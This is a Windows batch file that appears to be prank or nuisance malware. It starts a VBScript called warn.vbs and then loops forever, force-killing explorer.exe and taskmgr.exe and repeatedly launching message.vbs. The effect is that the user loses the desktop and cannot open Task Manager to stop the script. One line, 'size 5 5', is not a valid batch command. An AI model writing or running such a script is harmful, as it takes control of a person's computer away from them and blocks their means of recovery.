@echo off
start .\warn.vbs
:c
size 5 5
taskkill /f /IM explorer.exe
start .\message.vbs
taskkill /f /IM taskmgr.exe
goto c
